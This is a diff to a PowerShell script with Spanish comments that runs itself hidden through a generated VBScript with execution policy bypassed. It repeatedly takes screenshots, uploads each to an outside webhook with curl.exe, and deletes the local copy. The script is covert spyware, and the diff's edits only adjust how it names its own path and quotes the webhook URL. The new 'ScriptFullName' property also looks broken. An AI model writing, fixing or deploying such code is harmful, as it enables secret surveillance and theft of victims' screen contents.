@@ -9,7 +9,7 @@ if ($hookurl.Length -ne 121) {
 }
 
 # Obtener la ruta del directorio donde se encuentra este script
-$scriptDirectory = Split-Path -Parent $MyInvocation.MyCommand.Definition
+$scriptDirectory = Split-Path -Parent $MyInvocation.MyCommand.ScriptFullName
 
 # Obtener la ruta del archivo de VBScript
 $vbsScriptPath = Join-Path -Path $scriptDirectory -ChildPath "RunHidden.vbs"
@@ -18,7 +18,7 @@ $vbsScriptPath = Join-Path -Path $scriptDirectory -ChildPath "RunHidden.vbs"
 if (-not (Test-Path $vbsScriptPath)) {
 @"
 Set WshShell = CreateObject(""WScript.Shell"")
-WshShell.Run ""powershell.exe -ExecutionPolicy Bypass -File '$($MyInvocation.MyCommand.Definition)'"", 0, false
+WshShell.Run ""powershell.exe -ExecutionPolicy Bypass -File '$($MyInvocation.MyCommand.ScriptFullName)' "", 0, false
 "@ | Set-Content -Path $vbsScriptPath -Encoding ASCII
 }
 
@@ -39,7 +39,7 @@ do {
         $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
     }
     Start-Sleep 1
-    curl.exe -F "file1=@$filett" $hookurl
+    curl.exe -F "file1=@$filett" "$hookurl"
     Start-Sleep 1
     Remove-Item -Path $filett
     Start-Sleep $seconds
